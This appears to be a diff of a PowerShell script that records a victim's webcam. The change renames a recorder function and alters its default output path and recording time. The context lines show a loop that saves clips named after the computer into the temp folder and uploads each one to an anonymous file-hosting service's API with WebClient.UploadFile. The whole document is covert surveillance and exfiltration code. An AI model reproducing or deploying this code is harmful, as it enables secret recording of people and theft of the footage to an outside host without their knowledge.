@@ -1,19 +1,15 @@
-function Start-WebcamRecorder{
+function Start-WebcamLogger{
     [CmdletBinding()]
     param
     (
       [Parameter(Position=0,Mandatory=$False)]
       [ValidateNotNullOrEmpty()]
-      [Alias("FilePath")]
-      [string]$OutPath,
-      [Parameter()]
+      [string]$OutPath = "$env:temp/out.mp4",
+      [Parameter(Mandatory=$False)]
       [ValidateNotNullOrEmpty()]
-      [int]$RecordTime
+      [int]$RecordTime = 10
     );
-  
-    if (-not $PSBoundParameters["OutPath"]){ $OutPath = "$env:temp\out.mp4" };
-    if (-not $PSBoundParameters["RecordTime"]){ $RecordTime = 5 };
-   
+
     try { $filters = New-Object DirectX.Capture.Filters }
     catch [Exception]{ $_; break; };
     
@@ -61,7 +57,7 @@ while($count -ne $TimesRun){
   $path = "$env:temp\$env:computername-$time.mp4";
   $url="https://api.anonfiles.com/upload?token=$Anontoken";
 
-  Start-WebcamRecorder $path -RecordTime $RecordTime;
+  Start-WebcamLogger $path -RecordTime $RecordTime;
   (New-Object System.Net.WebClient).UploadFile($url,$path) > $null;
   
   $count++;
